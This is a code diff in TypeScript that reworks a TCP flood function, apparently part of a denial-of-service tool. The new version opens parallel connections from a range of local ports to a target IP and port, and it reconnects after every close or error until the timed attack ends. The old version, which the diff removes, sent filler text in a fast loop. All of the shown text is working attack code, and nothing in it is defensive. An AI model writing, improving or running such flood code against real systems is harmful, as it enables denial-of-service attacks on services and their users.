@@ -2,35 +2,49 @@ import { Socket } from 'net';
 
 const attackDuration = 30000;
 
-const data = 'Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.';
+export async function tcpFlood (ip: string, port: number, localPorts: [number, number]): Promise<void> {
+  console.log(`starting tcp flood ${ip}:${port} using localPorts ${localPorts[0]}-${localPorts[1]}`);
+  let promises = [];
 
-export async function tcpFlood (ip: string, port: number): Promise<void> {
-  console.log(`starting tcp flood ${ip}:${port}`);
+  for (let i = localPorts[0]; i <= localPorts[1]; i++) {
+    promises.push(connectTCP(ip, port, i));
+  }
+
+  await Promise.all(promises);
+}
+
+async function connectTCP (ip: string, port: number, localPort: number): Promise<void> {
+  // unless attackDuration has passed on error or close open connection again
   const startTime = new Date();
 
   return new Promise((resolve) => {
     let tcpRequest = () => {
+      if (Date.now() - startTime.getTime() > attackDuration) {
+        // attack time has expired, resolve
+        return resolve();
+      }
+
       try {
         let client = new Socket();
 
-        client.connect(port, ip, function () {
-          client.write(data);
-          client.end();
-        });
-
         client.on('error', () => {
-          // swallow errors
+          // swallow error and just try again after short timeout
           return;
         });
+
+        client.on('close', () => {
+          // this also happens when an error occurs
+          // just try again after a short delay
+          setTimeout(tcpRequest, 100);
+        });
+
+        client.connect({
+          host: ip,
+          port:port,
+          localPort: localPort
+        })
       } catch (error) {
         console.error('error while doing tcpRequest', error);
-      }
-
-      if (Date.now() - startTime.getTime() < attackDuration) {
-        setTimeout(tcpRequest, 1);
-      } else {
-        resolve();
-        console.log(`stopping tcp flood ${ip}:${port}`);
       }
     };
 
